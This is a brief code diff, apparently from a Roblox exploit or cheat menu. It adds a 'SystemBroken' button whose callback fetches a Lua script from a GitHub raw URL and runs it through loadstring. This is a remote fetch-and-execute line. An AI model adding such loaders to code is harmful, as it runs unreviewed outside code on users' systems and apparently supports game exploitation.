@@ -201,7 +201,12 @@ MainTab:CreateButton({
     end
 })
 
-
+MainTab:CreateButton({
+    Name = "SystemBroken",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/bilsr/webshares/refs/heads/main/systembroken.lua"))()
+    end
+})
 
 MainTab:CreateSection("Games")
 
